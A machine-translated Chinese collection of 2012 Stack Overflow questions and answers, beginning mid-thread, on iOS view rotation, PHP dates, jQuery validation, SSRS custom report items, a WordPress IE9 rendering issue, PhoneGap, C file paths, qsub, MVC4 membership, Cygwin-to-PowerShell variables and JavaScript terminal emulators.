好吧，在尝试了各种方法来尝试解决这个问题之后，我想出了这个适用于 iOS 5.x 和 6.x 的解决方案。

基本上，问题似乎是因为导航控制器，所以，而不是做

```
self.view = landscape.view; 
```

或者

```
self.view = portrait.view; 
```

您需要替换导航控制器堆栈中包含的所有视图控制器。

我在下面的代码中所做的是创建导航控制器堆栈中所有视图控制器的 NSMutableArray。然后循环每个视图控制器并获取视图标签以确定需要替换哪个视图。然后我只需将视图控制器替换为横向或纵向版本，然后将导航控制器视图控制器数组设置为修改后的数组，从而替换所有视图控制器。

```
if (UIDeviceOrientationIsLandscape(deviceOrientation) && !self.appDelegate.isShowingLandscapeView)
{
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard-Landscape" bundle:[NSBundle mainBundle]];
    SearchViewController * landscape = [storyboard instantiateViewControllerWithIdentifier:@"SearchViewController-Landscape"];
    self.appDelegate.isShowingLandscapeView = YES;
    [UIView transitionWithView:landscape.view duration:0 options:UIViewAnimationOptionTransitionCrossDissolve|UIViewAnimationCurveEaseIn animations:^{
        NSMutableArray * viewControllers = [NSMutableArray arrayWithArray:[self.navigationController viewControllers]];
        if (viewControllers && [viewControllers count] > 0)
        {
            for (NSUInteger index = 0; index < [viewControllers count]; index++)
            {
                if ([[[viewControllers objectAtIndex:index] view] tag] == 1000)
                {
                    RootViewController * root = [storyboard instantiateViewControllerWithIdentifier:@"RootViewController-Landscape"];
                    [viewControllers replaceObjectAtIndex:index withObject:root];
                }
                else if ([[[viewControllers objectAtIndex:index] view] tag] == 2000)
                {
                    [viewControllers replaceObjectAtIndex:index withObject:landscape];
                }
            }

            [self.navigationController setViewControllers:viewControllers];
        }
    } completion:NULL];
}
else if (UIDeviceOrientationIsPortrait(deviceOrientation) && self.appDelegate.isShowingLandscapeView)
{
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard-Portrait" bundle:[NSBundle mainBundle]];
    SearchViewController * portrait = [storyboard instantiateViewControllerWithIdentifier:@"SearchViewController"];
    self.appDelegate.isShowingLandscapeView = NO;
    [UIView transitionWithView:portrait.view duration:0 options:UIViewAnimationOptionTransitionCrossDissolve|UIViewAnimationCurveEaseIn animations:^{
        NSMutableArray * viewControllers = [NSMutableArray arrayWithArray:[self.navigationController viewControllers]];
        if (viewControllers && [viewControllers count] > 0)
        {
            for (NSUInteger index = 0; index < [viewControllers count]; index++)
            {
                if ([[[viewControllers objectAtIndex:index] view] tag] == 1000)
                {
                    RootViewController * root = [storyboard instantiateViewControllerWithIdentifier:@"RootViewController"];
                    [viewControllers replaceObjectAtIndex:index withObject:root];
                }
                else if ([[[viewControllers objectAtIndex:index] view] tag] == 2000)
                {
                    [viewControllers replaceObjectAtIndex:index withObject:portrait];
                }
            }

            [self.navigationController setViewControllers:viewControllers];
        }
    } completion:NULL];
} 
```

我已经扩展了代码以展示如何在导航控制器中的嵌套视图上使用它。如果您正在使用根视图控制器，您显然不需要遍历所有视图控制器，只需替换索引 0 处的视图控制器。

希望这对某人有帮助！

# php - 在两次之间均匀分布值

> ID：13822328
> 
> 赞同：3
> 
> 时间：2012-12-11T14:53:40.593
> 
> 标签：php, datetime

我有以下代码。我需要在两次之间平均分配值：现在 + 20 分钟到 15:30。以下代码是循环的一部分，为了简洁起见，我没有包括在内。

```
$numlines = count($data);

$calltime = date('U', strtotime('+20 minutes');

$to = date('U', strtotime('15:30'));
$from = $calltime;

$diffinsec = $to - $from;

$apptseparation = ceil($diffinsec / $numlines);

$calltime = date('H:i', strtotime('+' . $apptseparation . ' seconds', $calltime); 
```

我在这里要做的是将当前时间加上 20 分钟，将其转换为 Unix 纪元，并在同一天从 15:30 减去它。结果应该是两次之间的秒数。

然后我想将秒数除以输入文件中的总行数，得到每个值之间的总秒数。最后，我想将此数字添加到现有的 $calltime 变量中，以便循环的每次迭代都会添加新时间。

但是，我所拥有的不起作用。日期数学总是让我感到困惑，在 PHP 中更是如此。如果您需要更多信息，请告诉我！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T17:09:59.403

那么，你得到的结果和你期望的结果是什么？如果我很好理解，这段代码似乎可以工作：

```
 $calltime = strtotime('+20 minutes');
    $from = $calltime;
    $to = strtotime('15:30');

    $diffinsec = $to - $from;
    if ( $diffinsec < 0 ) { // If it is 18:04 per example
        $diffinsec *= -1;
    }
    $apptseparation = ceil($diffinsec / $numlines);

    $calltime = date('H:i', strtotime('+'.$apptseparation.' seconds', $calltime)); 
```

# javascript - JQuery 的验证问题

> ID：13822335
> 
> 赞同：0
> 
> 时间：2012-12-11T14:54:10.097
> 
> 标签：javascript, jquery, html, jquery-validate

我正在进行如下的 JQuery 验证：（我不太了解 jquery）..

**我无法完成以下事情：**

1.  只允许使用字母 a 到 z（小写）、“-”（破折号或连字符）和“”（空格），
2.  必须输入“-”（破折号）和“”（空格）字母，
3.  “-”或“”字母不能是输入的第一个或最后一个字母，
4.  “-”不能是“”的直接邻居或相邻（之前或之后），
5.  “-”或“”不能是其自身的直接邻居（相邻）。
6.  “电话”号码字段（4 位区号、一个空格、7 位本地代码）

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
  <script type="text/javascript" 
          src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js">
  </script>

  <script type="text/javascript" 
          src="http://jzaefferer.github.com/jquery-validation/jquery.validate.js">
  </script>

  <script>
    $(document).ready(function(){
      $("#commentForm").validate({
        onfocusout: function(element) { $(element).valid(); } ,
        rules: {
            fullname : {
              required: true,
              maxlength: 14,
            },                  
            email: {
              required: true,
              email: true
            }
        },
        messages: {
            fullname : {
              required: "Please specify your Full Name",
              maxlength:  "Please enter only upto 14 characters",
            },
            email: {
              required: "We need your email address to contact you",
              email: "Your email address must be in the format of name@domain.com"
            }
        }
      });
   });

   </script>

  </head>

  <body>

    <form id="commentForm" method="get" action="">

       <fieldset>

       <p>
         <label for="fullname">Full Name</label>
         <em>*</em><input id="fullname" name="fullname" size="25" class="required"  maxlength="14" />
       </p>

       <p>
         <label for="email">E-Mail</label>
         <em>*</em><input id="email" name="email" size="25"  class="required email" />
       </p>

     </fieldset>

  </form>
  </body>
</html> 
```

**请有人帮助我实现这一目标..？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T16:18:34.850

使用正则表达式！！

*   只允许使用字母 a 到 z（小写）、“-”（破折号或连字符）和“”（空格）

    `!/[^a-z0-9 -]/.test(input)`

*   必须输入“-”（破折号）和“”（空格）字母，

    `/ /.test(input) && /-/.test(input)`

*   “-”或“”字母不能是输入的第一个或最后一个字母，

    `!/^[ |-]|[ |-]$/.test(input)`

*   “-”不能是“”的直接邻居或相邻（之前或之后），

*   “-”或“”不能是其自身的直接邻居（相邻）。

    `!/ -|- |--| /.test(input)`

*   “电话”号码字段（4 位区号、一个空格、7 位本地代码）

    `/^\d{4} \d{7}$/.test('1234 1234567')`

如果满足条件，则每个表达式都返回 true，否则返回 false，像这样使用它：

```
var input = $('some-selector').value();
if(
  !/[^a-z0-9 -]/.test(input) &&
  / /.test(input) && /-/.test(input) &&
  !/^[ |-]|[ |-]$/.test(input) &&
  !/ -|- |--|  /.test(input) &&
  /^\d{4} \d{7}$/.test(input )
){
   //do something
} 
```

更好的是，如果您正在格式化电话号码，请删除所有非数字字符，

```
input = input.replace(/[^0-9]/,'') 
```

数一数（他们必须是 11）

```
input.length == 11 
```

然后根据需要格式化它们。

# c# - 如何使用 SSRS 2012 实现 OnDemandReportingRendering.ICustomReportItem 接口

> ID：13822336
> 
> 赞同：0
> 
> 时间：2012-12-11T14:54:09.720
> 
> 标签：c#, .net, sql-server, reporting-services, ssrs-2012

**背景**

在我们的开发中。团队我们正在将 SSRS 2005 升级到 SSRS 2012，我正在尝试对我们的代码进行适当的更改以使其正常工作。我们的主要问题是我们之前使用 Dundas 生成图表，自从 Microsoft 购买了 Dundas 并在 2008 年之前将该组件合并到 SSRS 中，我们需要在我们的解决方案中解决这个问题。在 Internetz 上进行一些阅读后，我得出的结论是，我当前的任务任务是实现一个运行时组件，我称之为 MReport（生产中的另一个名称），它实现位于 OnDemandReportingRendering 命名空间中的 ICustomReportItem 接口。

在我们使用 SSRS 2005 的解决方案中，我们使用 Dundas 生成图表，并且在 Dundas.ReportingServices 命名空间中，有一个以前使用过的名为 DundasChart 的类，它实现了 ICustomReportItem 的另一个（旧？）版本，它与我试图遵守的接口完全不同和。此较旧的 ICustomReportItem 位于 ReportRendering 命名空间中，而不是 OnDemandReportRendering 命名空间中。我认为我应该使用后者的唯一原因是因为微软让我知道首先我应该使用运行时组件来实现我想要的。

自定义报表项的运行时组件由报表处理器在运行时调用。运行时组件接受报表处理器在运行时传递的数据，处理此数据，并返回包含呈现的自定义报表项的图像。(5)

试图确切地找到应该如何完成我没有找到太多但在 Technet (1) 上它清楚地指出感兴趣的 ICustomReportItem 位于 SQL Server 2012 的 OnDemandReportRendering 命名空间中。如果选择“其他版本”和 SQL在 Server 2005 中，ICustomReportItem 指的是位于 ReportRendering 下的另一个接口。

**问题**

**加载程序集**

我遇到的第一个问题是，在部署后，我在调用 ReportExecutionService（生成的代理类）上的 Render 方法时收到以下警告： *“MReport”扩展无法加载扩展程序集。如果没有明确定义 AltReportItem，自定义报告项“CustomMarcusChart”将呈现 AltReportItem 或保留空白。*

EventViewer 完成： *报表服务器 (SQL2012) 无法加载 MReport 扩展。*

请注意，虽然我收到此警告，但当我将调试器附加到 ReportingServices 进程时，我仍然可以在为其加载符号的 MReport 类中设置断点，这暗示程序集毕竟以某种方式加载。

我已经按照我认为可能的程度执行了部署 CustomReportItem 的程序，如果我犯了任何错误，请纠正我：

*   在名为 MarcusReports 的类库中实现了 MReport 类（我的代码直接取自 Microsoft (1)(4)）
*   将类库构建为 .NET 3.5 程序集
*   将 DLL 和 PDB 文件复制到 C:\Program Files\Microsoft SQL Server\MSRS11.SQL2012\Reporting Services\ReportServer\bin\ 、 C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\PrivateAssemblies 和C:\Program Files\Microsoft Visual Studio 10.0\Common7\IDE\PrivateAssemblies
*   向 rssrvpolicy.config 添加了 CodeGroup 元素 (2)
*   向 rsreportserver.config (3) 添加了 ReportItem 元素 - 这是我不确定如何正确指定类型的阶段

**从作为参数提供给 GenerateReportItemDefinition 和 EvaluateReportItemInstance 的 CustomReportItem 中检索数据**

以前，Dundas 只是给了我们生成的图像，但现在看来我必须在这个新的 ICustomReportItem 接口的帮助下自己实现该行为，这导致了第二个问题。在较旧的 ICustomerReportItem 中有一个属性 CustomData，它是由 SSRS 在调用 Process 方法之前直接设置的（我认为）。CustomData 包含所有必要的数据以生成图形并返回它。在新的 ICustomerReportItem 接口中没有这样的成员，只有两个方法存根。但是，CustomerReportItem 实例作为参数传递给这些方法，人们会认为 CustomerReportItem 上的 CustomData 将保存必要的图形数据，但它没有，或者至少不在我们期望的结构中，具有系列和 x/y标签。

是否有任何地方可以阅读有关如何实现这一点的信息。对于如何实际使用新的 ICustomerReportItem 接口来生成自定义图形图像，我还没有找到任何好的材料或好的解释。

资料来源：

1) [http://technet.microsoft.com/en-us/library/ms345254(v=sql.110).aspx](http://technet.microsoft.com/en-us/library/ms345254(v=sql.110).aspx)

2)

```
 <CodeGroup
              class="UnionCodeGroup"
              version="1"
              PermissionSetName="FullTrust"
              Description="This code group grants MyCustomReportItem.dll FullTrust permission. ">
              <IMembershipCondition class="UrlMembershipCondition" version="1" Url="C:\Program Files\Microsoft SQL Server\MSRS11.SQL2012\Reporting Services\ReportServer\bin\MarcusReports.dll" />
           </CodeGroup> 
```

3)

```
 <ReportItems>
    <ReportItem Name="MReport" Type="MarcusReports.MReport,MReport"/>
 </ReportItems> 
```

4)

```
using System.Drawing.Imaging;
using System.IO;
using Microsoft.ReportingServices.OnDemandReportRendering;

namespace MarcusReports
{
    public class MReport : ICustomReportItem
    {
        public void GenerateReportItemDefinition(CustomReportItem cri)
        {
            // Create the Image object that will be
            // used to render the custom report item
            cri.CreateCriImageDefinition();
            var polygonImage = (Image )cri.GeneratedReportItem;
        }

        public void EvaluateReportItemInstance(CustomReportItem cri)
        {
            // Get the Image definition
            var polygonImage = (Image )cri.GeneratedReportItem;

            // Create the image for the custom report item
            polygonImage.ImageInstance.ImageData = DrawImage(cri);
        }

        /// <summary>
        /// Creates an image of the CustomReportItem's name
        /// </summary>
        private static byte[] DrawImage( ReportItem customReportItem)
        {
            var width = 1;          // pixels
            var height = 1;         // pixels
            const int resolution = 75; // dpi

            var bitmap = new System.Drawing.Bitmap(width, height);
            bitmap.SetResolution(resolution, resolution);

            var graphics = System.Drawing.Graphics .FromImage(bitmap);
            graphics.PageUnit = System.Drawing. GraphicsUnit.Pixel;

            // Get the Font for the Text
            var font = new System.Drawing.Font(System.Drawing.FontFamily .GenericMonospace, 12, System.Drawing.FontStyle.Regular);

            // Get the Brush for drawing the Text
            var brush = new System.Drawing.SolidBrush(System.Drawing.Color .LightGreen);

            // Get the measurements for the image
            var maxStringSize = graphics.MeasureString(customReportItem.Name, font);
            width = ( int)(maxStringSize.Width + 2 * font.GetHeight(resolution));
            height = ( int)(maxStringSize.Height + 2 * font.GetHeight(resolution));

            bitmap.Dispose();
            bitmap = new System.Drawing.Bitmap (width, height);
            bitmap.SetResolution(resolution, resolution);

            graphics.Dispose();
            graphics = System.Drawing. Graphics.FromImage(bitmap);
            graphics.PageUnit = System.Drawing. GraphicsUnit.Pixel;

            // Draw the text
            graphics.DrawString(customReportItem.Name, font, brush, font.GetHeight(resolution),font.GetHeight(resolution));

            // Create the byte array of the image data
            var memoryStream = new MemoryStream();
            bitmap.Save(memoryStream, ImageFormat.Bmp);
            memoryStream.Position = 0;
            var imageData = new byte[memoryStream.Length];
            memoryStream.Read(imageData, 0, imageData.Length);

            return imageData;
        }
    }
} 
```

5) [http://msdn.microsoft.com/en-us/library/ms345219.aspx](http://msdn.microsoft.com/en-us/library/ms345219.aspx)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T09:30:22.047

更新。我通过更新 rsreportserver.config 中的类型解决了第一个问题。显然，当我输入 MarcusReports.MReport，MReport 时我犯了一个错误，因为 MReport 不是 AssemblyName，它实际上应该是第二个输入。

类型指定为`Namespace.class,Assembly name`

因此，在将 rsreportserver.config 中的 CustomReportItem 注册更改为下面的代码段后，我现在可以部署并使其正常运行。CustomData 以及如何查找值的问题仍然存在。遍历 cri.CustomData 中的结构后，找不到任何值。有任何想法吗？

```
<ReportItems>
     <ReportItem Name="MReport" Type="MarcusReports.MReport,MarcusReports"/>
</ReportItems> 
```

# wordpress - Wordpress 仅在 IE9 中中断

> ID：13822338
> 
> 赞同：1
> 
> 时间：2012-12-11T14:54:19.547
> 
> 标签：wordpress, internet-explorer-9, quirks-mode

我最近被一家新公司聘用，我的职责之一是维护旧网站。最近引起我注意的是，其中一个 Wordpress 在 IE9 中被破坏了。

www.nexoslatinos.com

我试过停用所有插件，没有修复。

我试过切换到默认主题，即使它们看起来很糟糕。

我在 IE9 中打开了开发人员工具，它以所谓的“Quirks Mode”呈现网站？？

主题大部分与西班牙语翻译版本中的主题相同：www.nexoslatinos.com/espanol，在 IE9 中呈现良好。当采用西班牙语翻译主题并将其应用于第一个 wordpress 时，它会中断。这两个主题也运行相同的插件。然而，它们是不同的 wordpress 安装。

当我查看页面的源代码时，我在 doctype 之前得到了一行奇怪的代码：

```
<!--331c6883dd6010864b7ead130be77cd5--> 
```

这会甩掉IE9吗？我无法找到代码的来源，但在我最初的故障排除中查看该站点时它突出了。

主题的代码有点乱而且无效，但尽管在 Chrome、FF 和 Safari 中显示良好。

想法？洞察力？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:25:50.740

该注释（不是代码）是“ **pizda** ”的 MD5 散列 - 这是东欧的贬义词，意思是各种语言中的阴道。您可以查看此[http://en.wiktionary.org/wiki/pizda](http://en.wiktionary.org/wiki/pizda)了解人种学细节。

检查您的 WP 主题是否有可能看起来可疑的代码片段。如果它不存在，请检查站点范围的服务器端包含 (SSI) 的 apache 配置。

由于我没有查看该站点，因此我不想提醒您，但我会检查文件、数据库中是否存在恶意软件，无论是服务器端、客户端还是两者兼而有之。不是 100% 肯定，但另外还有一个 pizda 内核漏洞利用 - 您可能希望检查主机。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:02:57.373

这听起来像是一个文件编码问题。我建议检查以确保构成主题的所有 php 文件以及所有可能已修改的 Wordpress 核心文件都是 UTF-8。您可以在代码编辑器中执行此操作，或者在此处检查每个文件：http: [//people.w3.org/rishida/utils/bomtester/](http://people.w3.org/rishida/utils/bomtester/)

缩小潜在问题文件范围的更快方法可能是创建一个干净的虚拟 Wordpress 安装并激活看似有问题的主题。如果问题仍然存在，则一定是您的某个主题文件有问题。如果它不存在，我怀疑可能对 Wordpress 核心文件进行了一些不合理的编辑。

# javascript - TypeError：'未定义'不是函数phonegap jquery

> ID：13822341
> 
> 赞同：0
> 
> 时间：2012-12-11T14:54:35.423
> 
> 标签：javascript, jquery, cordova, typeerror

我对phonegap有疑问。这是一个非常奇怪的问题，我每次都无法抓住它。我使用 phonegap 2.2 和 jquery mobile 1.0 编写了一个 iphone 应用程序。事实上，我的代码在浏览器中工作正常（在 chrome 和 safari 中测试，从来没有这样的错误），但是当我使用应用程序时，我经常遇到 TypeError：

例如我尝试调用js函数

```
Pages['thread'].beforeShow(); 
```

在文件 Thread.js 我有这样的东西：

```
Pages['thread'] = {
    ...
    beforeShow: function() {
        ...
    }
    ...
} 
```

有时，尤其是当我从后台运行应用程序时出现错误

*   类型错误：“未定义”不是函数
*   文件：.../Thread.js
*   line: 19 ("beforeShow" 行)

那怎么可能呢？它知道函数所在的文件，知道函数所在的行，但会抛出 TypeError: 'undefined' is not a function。

我不知道:(也许有人有？

谢谢！

# c - 用c语言从同一目录打开文件而不使用完整路径

> ID：13822342
> 
> 赞同：4
> 
> 时间：2012-12-11T14:54:36.057
> 
> 标签：c, xcode, file, directory, fopen

我正在尝试执行以下操作：

```
FILE *fileNAME = fopen("file.txt", "r"); 
```

当我有以下情况时它可以工作：

```
FILE *fileNAME = fopen("users/username/desktop/folder/file.txt", "r"); 
```

但是因为我想在我的家用计算机之外使用这个文件，所以路径应该是相对的，特别是对于无法访问实际源代码的最终用户。我的问题是，如何实际完成这项工作，如果问题是由于编译器默认没有使用正确的目录，我该如何更改？（我正在使用 XCODE）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:00:45.787

当您通过命令调用程序时，您可以将文件路径作为输入参数传递

```
$myprogram users/username/desktop/folder/file.txt 
```

在您的代码源中，您可以从 argv 获取此路径

```
int main (int argc, char **argv)
{
   char *file_path = argv[1];
   ....
} 
```

argc 是 argv 数组的长度。因此，如果数组长度小于 2，则程序应返回帮助消息以指示用户输入文件路径作为参数

```
int main (int argc, char **argv)
{
   char *file_path;
   if (argc <2) {
      printf("Usage: %s <file path>\n", argv[0]);
      exit(1);
   }
   file_path = argv[1];
   ....
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:02:10.947

如果您使用的是 Mac OS X（Xcode，对，我不是 OS X 用户，但我认为是它？），您可以获取当前的可执行路径（不是当前的工作目录路径）

```
char path[1024];
uint32_t size = sizeof(path);
if (_NSGetExecutablePath(path, &size) == 0)
    printf("executable path is %s\n", path);
else
    printf("buffer too small; need size %u\n", size); 
```

在此之后，您有两种方法：

1）更新组合文件路径与exe目录（如`sprintf(filepath, "%s/%s", path, "file.txt");`）

[2) 使用chdir](http://linux.die.net/man/2/chdir)函数更改当前目录并使用相对路径访问文件。

编辑：_NSGetExecutablePath 返回可执行路径，而不是可执行目录，因此使用`substr`/`strrchr`提取最后一次出现“/”字符之前的路径。

# python - 如何从命令行将 qsub 与 Python 一起使用？

> ID：13822344
> 
> 赞同：2
> 
> 时间：2012-12-11T14:54:39.627
> 
> 标签：python

我刚试过这个命令：

```
qsub python commandLineDouble.py 1 10 1 
```

并收到此错误：

> 由于错误而无法读取脚本文件：打开python时出错：没有这样的文件或目录

我在一个通常`qsub` `.csh`可以很好地归档的计算集群上运行它。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-16T16:33:21.387

使用 -S 选项

`$ qsub -S $(which python) commandLineDouble.py 1 10 1`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-11T15:00:30.920

我的印象是，`qsub`从集群到集群的行为不同。但是根据我的经验，我总是这样做：

```
qsub myscrip.sh 
```

请注意，这不同于：

```
qsub bash myscript.sh
qsub csh myscript.csh 
```

换句话说，`qsub`它是围绕外壳（通常是特定外壳，但由于外壳足够相似，这通常不是问题），而不是围绕任意命令。这里的简单解决方法是将您的命令放入 shell 脚本并提交：

```
#qsub directives here
#wrapper.sh
python commandLineDouble.py 1 10 1 
```

现在您只需这样做`qsub wrapper.sh`，并且 Bob 是您的叔叔（假设您的集群的并行环境安装了 python ......）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-08-28T23:55:27.493

在 PBS Pro 上，如果要提供实际命令行而不是脚本，则需要使用双连字符：

qsub -- python commandLineDouble.py 1 10 1

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-11T23:17:45.943

你试过`echo "script.py <args>" | qsub`吗？

# c# - 关于在.Net Mvc 4中编写自己的账号注册方法的几个问题

> ID：13822346
> 
> 赞同：2
> 
> 时间：2012-12-11T14:54:49.370
> 
> 标签：c#, asp.net-mvc, entity-framework, ef-code-first

我正在尝试在 Mvc 4 应用程序中编写自己的帐户注册逻辑。我从一个基本模板开始，而不是互联网模板。目前我有一个`Tenant`具有许多属性的模型。首先使用代码，我在我的数据库中创建了一个租户表（随着时间的推移会添加更多模型和表 - 我只是想让一个先工作）。

我创建了一个**RegisterTenantModel** - 类似于 Internet 模板中的那个，除了我使用的是电子邮件而不是用户名。

```
public class TenantRegisterModel
{
    [Required]
    [Display(Name="Email")]
    public string Email { get; set; }

    [Required]
    [StringLength(100, ErrorMessage = "The {0} must be at least {2} characters long.", MinimumLength = 6)]
    [DataType(DataType.Password)]
    [Display(Name = "Password")]
    public string Password { get; set; }

    [DataType(DataType.Password)]
    [Display(Name = "Confirm password")]
    [Compare("Password", ErrorMessage = "The password and confirmation password do not match.")]
    public string ConfirmPassword { get; set; }
} 
```

在下面的**RegisterTenant**方法中，我想：

*   允许用户（租户）最初仅使用电子邮件地址和密码进行注册，并且仅在通过电子邮件验证其帐户后才允许他们输入与租户相关的其余属性，因此使用`TenantRegisterModel`.

在调用`Membership.CreateUser`时，我怎么知道`model.Email`并将`model.Password`被添加到`Tenant`表中？同样，如果我对 a 执行与上述相同的场景，`Landlord`我怎么知道输入的详细信息已添加到`Landlord`表中？有没有办法`Membership.CreateUser`我也可以指定要添加用户详细信息的表？

**注册租户：**

```
public ActionResult RegisterTenant(TenantRegisterModel model)
    {
        if (ModelState.IsValid)
        {
            // Attempt to register a tenant account
            MembershipCreateStatus createStatus;
            Membership.CreateUser(model.Email, model.Password);
            // ...
        }
    } 
```

我当然有一个上下文类，目前有`public DbSet<LetLord.Models.Tenant> Tenants { get; set; }`，那么如果我有多个 DbSet，我如何知道正在添加用户详细信息的表？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T17:22:43.647

MVC 4 不使用与 MVC 3 相同的成员资格。您想查找 simplemembership。对于为用户存储额外数据的常见问题，这实际上是一个非常好的解决方案。

[http://weblogs.asp.net/jgalloway/archive/2012/08/29/simplemembership-membership-providers-universal-providers-and-the-new-asp-net-4-5-web-forms-and- asp-net-mvc-4-templates.aspx](http://weblogs.asp.net/jgalloway/archive/2012/08/29/simplemembership-membership-providers-universal-providers-and-the-new-asp-net-4-5-web-forms-and-asp-net-mvc-4-templates.aspx)

这是开始阅读它的好地方。不确定您对 MVC3 Membership Provider 和 Database Schema 有多熟悉，但这在 MVC4 中发生了很大变化。我花了一段时间才找到一切。

基本上，使用新设置，您可以使用所需的任何信息创建自己的用户表，并简单地将数据库的 1 列映射为 id（现在是一个 int，而不是像 mvc3 成员资格提供程序和模式那样的（guid））和“用户名”可以是电子邮件或任何类似的唯一标识符

```
WebSecurity.InitializeDatabaseConnection("DefaultConnection", "UserProfile", "UserId", "UserName", autoCreateTables: false); 
```

您将连接字符串链接到数据库，它将使用该数据库创建成员资格模式。然后，您可以将模型添加到您的上下文中，并为 dbcontext.UserProfile.FirstName 等函数使用实体框架。

这是一些更多的起点材料

[http://patrickdesjardins.com/blog/asp-net-membership-with-mvc4](http://patrickdesjardins.com/blog/asp-net-membership-with-mvc4)

祝你好运

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:23:58.217

您可能应该`Membership`自己实现并将其注册为`MembershipProvider`您的 web.config。通过这种方式，您可以完全控制数据发生的情况，并且您仍然拥有所有不错的功能。

MVC3 中有一个[示例项目](http://visualstudiogallery.msdn.microsoft.com/3f98d8eb-75b8-4913-963a-8d37f4326e88)，它实现了 Code-first Membership- 和 Roleprovider，它可以让您了解它是如何完成的。

或者，您可以使用 ProfileProvider 保存一些激活密钥（和您的其他自定义用户字段）并将用户添加到某些角色，例如`"NotActivated"`.

更新：据我所知，标准 Membership-Provider 使用 web.config 中的 DefaultConnection。如果您在同一个数据库中使用 Code-First，它会中断，因为有一个结构不是由 code-first 构成的。我认为，您可以选择使用数据库优先。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T00:22:23.543

**我怎么知道 model.Email 和 model.Password 将被添加到 Tenant 表中？**

我向 UserProfile 模型添加了其他属性。然后在`CreateUserAndAccount`方法中我动态地传递属性如下：

```
WebSecurity.CreateUserAndAccount(model.UserName, model.Password, 
                                            new { Email = model.Email,
                                                  FirstName = model.FirstName,
                                                  LastName = model.LastName,
                                                  AccountType = model.AccountType,
                                                  DaytimeContactNumber = "",
                                                  EveningContactNumber = "" },
                                            false); 
```

**同样，如果我为房东执行上述相同的场景，我怎么知道输入的详细信息正在添加到房东表中？Membership.CreateUser 有没有办法我也可以指定要添加用户详细信息的表？**

我为房东和租户创建了角色，并且在`Register`我`CreateUserAndAccount`检查了 enum 的值之后`AccountType`：

```
if (model.AccountType == AccountType.Tenant)
                {
                    try
                    {
                        Roles.AddUserToRole(model.UserName, "Tenant");
                    }
                    catch (Exception e)
                    {
                        ModelState.AddModelError("Unable to add user to role", e);
                    }
                } 
```

# windows - 如何传播从 cygwin 运行的 powershell 的 windows 环境变量

> ID：13822347
> 
> 赞同：1
> 
> 时间：2012-12-11T14:54:50.387
> 
> 标签：windows, bash, powershell, cygwin

我已经安装了 cygwin，我即将执行一个用 powershell 编写的脚本。我这样做：

```
powershell "& ""C:\my\script.ps1""" 
```

这按预期工作，我必须这样做，因为在那个脚本中我正在执行另一个外部命令等等......

我想为该脚本添加一些环境变量，所以我想写一些类似的东西

```
powershell "$FOO="bar"; & ""C:\my\script.ps1""" 
```

这样我就可以访问`$FOO`脚本中的变量并对其进行处理。这个想法是，如果未定义该变量，我将使用一些默认值。我知道这也可以通过一些环境变量来实现，或者我可以将这些变量放入配置文件（profile.ps1），但我想摆脱那个文件，所以我不需要，我可以用变量覆盖默认值我展示出。

但它说：

```
=bar : The term '=bar' is not recognized as the name of a cmdlet, function,
script file, or operable program. Check the spelling of the name, or if a path
was included, verify that the path is correct and try again.
At line:1 char:1 
```

所以我在想这样的事情可以工作：

```
powershell { $web = "google.com" ; & ping.exe $web } 
```

但它只适用于powershell控制台而不是cygwin，它说cygwin

```
-bash: syntax error near unexpected token `&' 
```

所以它似乎`&`被视为 bash 字符。我试图以千种方式逃避它，例如

```
bash -c "'powershell { \$web = \"google.com\" ; & ping.exe \$web }'" 
```

但这是输出

```
bash: powershell { $web = "google.com" ; & ping.exe $web }: command not found 
```

谢谢你的提示。

**更新**

我能够做到这一点：

```
 powershell "Invoke-Command -ScriptBlock {\$env:FOO = \"google.com\" ; & ""C:\my\script.ps1"" }" 
```

但是，当我尝试通过它为空来访问该`FOO`变量`$env:FOO`时，似乎我无法这样做，因为该脚本正在另一个范围内运行，或者...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:24:07.990

此命令会将环境变量从 cygwin ( `$FOO="bar"`) 传递给 powershell，然后运行另一个`dir env:`列出环境变量的 powershell 命令 ()（证明已设置）：

```
powershell "\$env:FOO=\"bar\";dir env:" 
```

用您的脚本调用替换该`dir env:`部分，这应该适合您。

编辑：这是命令（引用略有不同），包括对外部脚本的调用：

```
powershell '$env:FOO="bar";& "C:\script name.ps1"' 
```

# javascript - 是否有任何 javascript 库可以在浏览器中呈现终端输出？

> ID：13822348
> 
> 赞同：26
> 
> 时间：2012-12-11T14:54:59.060
> 
> 标签：javascript, linux

我有一个包含终端输出的文本文件，其中包括各种字符代码，例如移动光标等。如何在浏览器中正确呈现它？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-11T15:41:43.317

基于使用 Javascript 的终端仿真，我发现了几个选项：

*   [jQuery 终端插件](http://terminal.jcubic.pl/)
*   [门一](https://github.com/liftoff/GateOne)
*   [http://cb.vu/](http://cb.vu/)
*   [贝壳盒](http://code.google.com/p/shellinabox/)

第一个选项似乎是最接近您需要的解决方案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-09-16T19:19:46.697

[https://github.com/drudru/ansi_up](https://github.com/drudru/ansi_up)可能是您需要的，它将任何终端输出呈现为 html

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-24T19:08:46.153

我使用 term.js、bone.io、expres.io 进行终端仿真。它工作得很好。

